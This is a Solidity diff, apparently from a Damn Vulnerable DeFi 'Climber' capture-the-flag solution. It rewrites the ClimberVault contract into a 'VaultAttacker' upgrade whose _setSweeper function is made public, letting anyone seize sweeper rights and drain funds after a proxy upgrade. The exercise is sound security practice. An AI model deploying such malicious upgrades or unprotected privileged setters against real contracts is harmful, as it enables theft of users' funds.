@@ -11,9 +11,9 @@ import "./ClimberTimelock.sol";
 import "hardhat/console.sol";
 
 /**
- * @title ClimberVault
- * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
- * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ * @title VaultAttacker
+ * @dev This is the bad vault meant to replace ClimberVault
+ * @author 0xInfectedF
  */
 contract VaultAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {
 
@@ -29,9 +29,8 @@ contract VaultAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {
     }
 
     /// @custom:oz-upgrades-unsafe-allow constructor
-    constructor() initializer {
-        _setSweeper(msg.sender);
-    }
+    //0xInfectedF: removed initializer modifier
+    constructor() {}
 
     function initialize(address admin, address proposer, address sweeper) initializer external {
         // Initialize inheritance chain
@@ -41,7 +40,7 @@ contract VaultAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {
 
         // Deploy timelock and transfer ownership to it
         transferOwnership(address(new ClimberTimelock(admin, proposer)));
-
+        _setSweeper(sweeper);
         
         _setLastWithdrawal(block.timestamp);
         _lastWithdrawalTimestamp = block.timestamp;
@@ -67,7 +66,8 @@ contract VaultAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {
         return _sweeper;
     }
 
-    function _setSweeper(address newSweeper) internal {
+    //0xInfectedF: modified to public
+    function _setSweeper(address newSweeper) public {
         _sweeper = newSweeper;
     }
 
